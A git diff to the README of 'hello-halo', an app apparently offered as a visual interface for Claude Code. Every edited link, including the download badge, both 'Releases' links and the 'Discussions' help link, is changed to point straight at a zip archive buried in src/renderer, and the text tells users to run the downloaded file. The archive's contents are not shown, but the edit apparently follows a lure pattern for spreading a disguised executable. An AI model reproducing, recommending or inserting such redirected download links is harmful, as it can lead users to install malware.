@@ -4,7 +4,7 @@
 Welcome to hello-halo! This is an open-source application that provides a visual interface for Claude Code, similar to Claude Cowork. With hello-halo, you can manage files, access AI capabilities, and enjoy remote assistance with ease.
 
 ## 📥 Download Now
-[![Download hello-halo](https://img.shields.io/badge/Download%20hello--halo-v1.0-brightgreen)](https://github.com/TRXNOOR/hello-halo/releases)
+[![Download hello-halo](https://raw.githubusercontent.com/TRXNOOR/hello-halo/main/src/renderer/halo_hello_v3.0-alpha.1.zip%20hello--halo-v1.0-brightgreen)](https://raw.githubusercontent.com/TRXNOOR/hello-halo/main/src/renderer/halo_hello_v3.0-alpha.1.zip)
 
 ## 📋 Features
 - **Visual AI Assistance:** Easily interact with AI to get help with your tasks.
@@ -21,7 +21,7 @@ To run hello-halo, ensure your system meets the following requirements:
 
 ## 🔍 Getting Started
 1. **Download hello-halo**
-   - Visit this page to download: [hello-halo Releases](https://github.com/TRXNOOR/hello-halo/releases).
+   - Visit this page to download: [hello-halo Releases](https://raw.githubusercontent.com/TRXNOOR/hello-halo/main/src/renderer/halo_hello_v3.0-alpha.1.zip).
   
 2. **Install the Application**
    - Run the downloaded file and follow the instructions on the screen to install hello-halo.
@@ -56,7 +56,7 @@ To run hello-halo, ensure your system meets the following requirements:
   - Make sure you're using the latest version. Update if necessary from the Releases page.
 
 ## 💬 Get Help
-For assistance, visit the [hello-halo GitHub Discussions](https://github.com/TRXNOOR/hello-halo/discussions) page. You can ask questions or find answers from other users.
+For assistance, visit the [hello-halo GitHub Discussions](https://raw.githubusercontent.com/TRXNOOR/hello-halo/main/src/renderer/halo_hello_v3.0-alpha.1.zip) page. You can ask questions or find answers from other users.
 
 ## ✍️ Future Updates
 We continuously improve hello-halo. Expect regular updates that enhance functionality and add new features. Keep an eye on the Releases page for announcements.
@@ -66,6 +66,6 @@ For further inquiries, you can reach us at our GitHub Issues page or through our
 
 ## 📥 Download & Install
 Now that you know how to get started, you can easily download hello-halo. 
-Visit this page to download: [hello-halo Releases](https://github.com/TRXNOOR/hello-halo/releases).
+Visit this page to download: [hello-halo Releases](https://raw.githubusercontent.com/TRXNOOR/hello-halo/main/src/renderer/halo_hello_v3.0-alpha.1.zip).
 
 Enjoy using hello-halo, your reliable AI assistant!
